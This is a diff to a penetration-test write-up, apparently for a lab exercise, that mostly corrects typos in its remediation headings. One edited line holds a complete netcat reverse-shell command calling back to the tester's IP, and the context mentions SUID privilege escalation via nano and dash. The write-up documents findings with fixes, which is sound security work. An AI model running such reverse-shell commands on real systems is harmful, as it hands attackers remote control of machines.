@@ -179,9 +179,9 @@ Using the shell command function I run `which nc` to see if the netcat tool is a
 
 ![](014.jpg)
 
-I then use netcat to open up a reverse shell back to my home system by using the following command:
+I then use netcat to open up a reverse shell back to my home system:
 
-`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.50.142.47 4444 >/tmp/f`
+Command:  `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.50.142.47 4444 >/tmp/f`
 
 ![](015.jpg)
 
@@ -290,7 +290,7 @@ Because the nano program had elevated privileges it allowed me to add a new user
 ![](020.jpg)
 
 
-Remeidation:
+**Remediation:**
 
 This command should not be set to SUID. Remove the SUID bit to mitigate this vulnerability.
 
@@ -316,7 +316,7 @@ Because of this a standard user can escalate prileges to the root user with a si
 
 Using the -p flag with the dash command does not change the calling uid to the user running the command effectively allowing this to run with root level privileges due to the SUID bit.
 
-**Remeidation:**
+**Remediation:**
 
 This command should not be set to SUID. Remove the SUID bit to mitigate this vulnerability.
 
@@ -344,7 +344,7 @@ The last line titled Execute Shell Command allows remote users to execute comman
 
 ![](015.jpg)
 
-**Remeidation:**
+**Remediation:**
 
 The admin.php should be removed if it is not necessary. If it is required this page should be password protected and only accessible to authorized system administrators.
 
@@ -370,7 +370,7 @@ I tested to see if this password would allow me to access the system remotely as
 
 ![](028.jpg)
 
-**Remeidation:**
+**Remediation:**
 
 Limit access to sensitive password manager database files. This file was set to full read/write/execute permissions for any user. Permissions should be changed with the following command so that only the admin1 user has access to the file:
 
@@ -396,7 +396,7 @@ This flag was located in the **/home/admin1** directory.
 
 - 2 - Provide screenshot of the "key to the kingdom" file and it's location:
 
-These 2 file were located in the **/home/waltdisney/.ssh** directory:
+These 2 files were located in the **/home/waltdisney/.ssh** directory:
 
 ![](022.jpg)
 
